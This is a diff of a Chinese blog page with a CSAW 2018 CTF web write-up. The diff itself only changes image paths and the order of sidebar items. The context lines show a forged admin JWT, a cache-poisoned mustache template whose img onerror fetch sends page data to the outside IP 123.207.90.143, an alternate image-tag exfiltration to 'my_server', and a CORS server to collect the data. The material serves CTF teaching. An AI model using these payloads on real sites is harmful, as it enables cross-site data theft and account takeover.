@@ -404,7 +404,7 @@
 <p>通过<code>auth code</code>获取<code>token</code>:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"</span><br><span class="line">token=$(curl --silent 2&gt;&amp;1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&amp;code=$&#123;auth_key&#125;&amp;client_id=$&#123;cl_id&#125;&amp;redirect_uri=http://web.chal.csaw.io:9000/oauth2/token")</span><br><span class="line">echo "Getting Json Response : $&#123;token&#125;"</span><br></pre></td></tr></table></figure>
 <p>得到<code>token</code>，通过<code>jwt.io</code>解密,然后将<code>type</code>修改为<code>admin</code>,密码设置为<code>ufoundme!</code>:</p>
-<p><img src="/assets/casw/TIM截图20180918172748.png" alt=""></p>
+<p><img src="/posts/42373/assets/casw/TIM截图20180918172748.png" alt=""></p>
 <blockquote>
 <p>s}ht@DESKTOP-GUA7PSI:/mnt/d/Program Files/cmder_mini$ curl  <a href="http://web.chal.csaw.io:9000/protected" rel="external nofollow" target="_blank">http://web.chal.csaw.io:9000/protected</a> -H “Authorization: Bearer JhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcyNjI3NjYsImV4cCI6MTUzNzI2MzM2Nn0.VNm-jOfhxfza8W8RpC7sr-zUDPtXBdfI4XkT1CCdS34” | grep -Eo “flag{.*}”</p>
 </blockquote>
@@ -442,7 +442,7 @@
 <p>结果:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;Content-Length&apos;: &apos;1575&apos;, &apos;Access-Control-Allow-Headers&apos;: &apos;X-Forwarded-Host&apos;, &apos;Access-Control-Max-Age&apos;: &apos;21600&apos;, &apos;Age&apos;: &apos;0&apos;, &apos;Server&apos;: &apos;gunicorn/19.9.0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;X-Varnish&apos;: &apos;157377770 157377768&apos;, &apos;Via&apos;: &apos;1.1 varnish-v4&apos;, &apos;Date&apos;: &apos;Wed, 19 Sep 2018 01:00:24 GMT&apos;, &apos;Access-Control-Allow-Origin&apos;: &apos;*&apos;, &apos;Access-Control-Allow-Methods&apos;: &apos;HEAD, OPTIONS, GET&apos;, &apos;Content-Type&apos;: &apos;application/javascript&apos;, &apos;Accept-Ranges&apos;: &apos;bytes&apos;&#125;</span><br><span class="line">var token = null;</span><br><span class="line"></span><br><span class="line">Promise.all([</span><br><span class="line">    fetch(&apos;/api/movies&apos;).then(r=&gt;r.json()),</span><br><span class="line">    fetch(`//1.2.3.4/cdn/main.mst`).then(r=&gt;r.text()),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        if (window.loaded_recapcha === true)</span><br><span class="line">            return resolve();</span><br></pre></td></tr></table></figure>
 <p>在使用浏览器刷新一下:</p>
-<p><img src="/assets/casw/22.png" alt=""></p>
+<p><img src="/posts/42373/assets/casw/22.png" alt=""></p>
 <p>可以看到这时候请求<code>http://1.2.3.4/cdn/main.mst</code>。然后，构造好模板文件，让管理员访问即可。</p>
 <p>构造main.mst如下:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; name &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; year &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; length &#125;&#125;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;fetch(&apos;http://123.207.90.143/&apos;+&apos;&#123;&#123;#movies&#125;&#125;&#123;&#123; name &#125;&#125;&#123;&#123;/movies&#125;&#125;&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
@@ -452,7 +452,7 @@
 <p><code>main.mst</code>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Header(&quot;Access-Control-Allow-Origin: *&quot;); ?&gt;</span><br><span class="line">&lt;img src=&quot;http://my_server/?c=&#123;&#123;#movies&#125;&#125;&#123;&#123;name&#125;&#125;&#123;&#123;/movies&#125;&#125;&quot;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
 <p>或者修改一下配置文件。</p>
-<p><img src="/assets/casw/45640104-590fbb80-bacf-11e8-9201-29f2ff6fc03d.png" alt=""></p>
+<p><img src="/posts/42373/assets/casw/45640104-590fbb80-bacf-11e8-9201-29f2ff6fc03d.png" alt=""></p>
 <p>如果不想修改配置文件，可以使用python启动一个服务器。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # Python 3</span><br><span class="line">    from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig</span><br><span class="line">    import sys</span><br><span class="line">    def test (*args):</span><br><span class="line">        test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)</span><br><span class="line">except ImportError: # Python 2</span><br><span class="line">    from BaseHTTPServer import HTTPServer, test</span><br><span class="line">    from SimpleHTTPServer import SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class CORSRequestHandler (SimpleHTTPRequestHandler):</span><br><span class="line">    def end_headers (self):</span><br><span class="line">        self.send_header(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure>
 <p>然后创建<code>cdn/main.mst</code>文件即可。</p>
@@ -637,24 +637,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1741,12 +1723,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1814,19 +1796,19 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1834,9 +1816,9 @@
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
-    
         <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
